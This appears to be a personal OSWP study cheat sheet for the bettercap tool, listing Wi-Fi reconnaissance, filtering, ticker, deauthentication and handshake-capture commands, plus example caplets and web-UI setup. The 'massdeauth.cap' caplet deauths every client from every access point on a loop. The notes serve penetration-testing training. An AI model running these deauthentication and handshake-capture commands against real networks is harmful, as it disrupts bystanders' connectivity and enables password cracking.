---
{"dg-publish":true,"permalink":"/oswp/i-bettercap/"}
---

----------------------
	Swiss Army Knife of Network Hacking

## Getting started
Start bettercap:
```
sudo bettercap -iface wlan0
```
Clear screen:
	clear
Exit bettercap:
	exit
--------------
## Modules vs. commands
- Six modules:
	- Bluetooth LE
	- HID on 2.4GHz
	- Ethernet
	- Wi-Fi
	- Ticker
-------------
## Commands:
### Scanning & discovery
Start/stop scanning for APs, clients & handshakes:
```
wifi.recon <on/off>
```
Scan for specific channels:
```
wifi.recon.channel 6,11
```
Clear specified channels:
```
wifi.recon.channel clear
```
Enumerate connected clients:
```
wifi.recon c6:2d:56:2a:53:f8
```
Exit client view:
```
wifi.recon clear
```
Display discovered wireless stations:
```
wifi.show
```
Clear discovered APs:
```
wifi.clear
```
Change how long for client to be marked as disconnected (default 300/five min):
```
set wifi.sta.ttl 100
```
Enable/disable 802.11 checksum validations:
```
set wifi.skip-broken <true/false>
```
### Filtering & sorting
Sort discovered stations:
```
set wifi.show.sort <column-name> <asc/desc>
```
Filter discovered stations:
```
set wifi.show.filter "WPA2"
```
Clear filter:
```
set wifi.show.filter ""
```
Enumerate clients connected to AP:
```
wifi.recon c6:2d:56:2a:53:f8
wifi.show
```
Filter discovered stations for signal strength (default -200):
```
set wifi.rssi.min -49
```
Limit number of APs displayed (clear with 0)
```
set wifi.show.limit 10
```
Show manufacturers:
```
set wifi.show.manufacturer true
```
### Tickers
Enable/disable ticker:
```
ticker <on/off>
```
Set ticker commands:
```
set ticker.commands "clear; wifi.show"
```
Run ticker on start:
```
sudo bettercap -iface wlan0 -eval "set ticker.commands 'clear; wifi.show'; wifi.recon on; ticker on"
```
Set ticker time to execution (default 1 sec):
```
set ticker.period 2
```
### Deauth & handshakes
Deauthenticating AP:
```
wifi.deauth c6:2d:56:2a:53:f8
```
Deauthenticating client:
```
wifi.deauth ac:22:0b:28:fd:22
```
Getting handshake:
```
get wifi.handshakes.file
```
Setting handshake save file:
```
set wifi.handshakes.file "/home/kali/handshakes/"
set wifi.handshakes.aggregate false
```
Adding devices to skip-list:
```
set wifi.deauth.skip ac:22:0b:28:fd:22,c6:2d:56:2a:53:f8
```
Skipping previously captured handshakes:
```
set wifi.deauth.acquired <true/false>
```
Deauthenticating open networks:
```
set wifi.dauth.open <true/false>
```
Hiding deauth-messages from terminal:
```
set wifi.deauth.silent <true/false>
```

------------------

## Caplets
Files that allows to run a series of commands in bettercap using .cap extension

Caplet directory: 
 `/usr/share/bettercap/caplets/`

Example caplet "massdeauth.cap":
```
set $ {by}{fw}{env.iface.name}{reset} {bold}» {reset}

# every 10 seconds deauth every client from every ap
set ticker.period 10
set ticker.commands clear; wifi.deauth ff:ff:ff:ff:ff:ff

# uncomment to only hop on these channels:
# wifi.recon.channel 1,2,3

wifi.recon on
ticker on
events.clear
clear
```

Example caplet "deauth_corp.cap":
```
set $ {br}{fw}{net.received.human} - {env.iface.name}{reset} » {reset}

set ticker.period 10
set ticker.commands clear; wifi.show; events.show; wifi.deauth c6:2d:56:2a:53:f8

events.ignore wifi.ap.new
events.ignore wifi.client.probe
events.ignore wifi.client.new

wifi.recon on
ticker on
events.clear
clear
```

Starting caplet:
```
sudo bettercap -iface wlan0 -caplet <caplet-file>
```

Starting caplet from session:
```
include <caplet-file>
```

---------

## Bettercap Web Interface

Set up server firewall rules:
```
sudo nft add table inet filter
sudo nft add chain inet filter INPUT { type filter hook input priority 0\; policy drop\; }
sudo nft add rule inet filter INPUT ip saddr <your-ip> tcp dport 443 accept
sudo nft add rule inet filter INPUT ip saddr <your-ip> tcp dport 8083 accept
```

Configure username and password:
```
sudo nano /usr/share/bettercap/caplets/https-ui.cap
#Edit lines 16 and 17
```

Start web UI:
```
sudo bettercap -iface wlan0 -caplet https-ui
```

Access:
- Accept self-signed certs on main page and :8083/api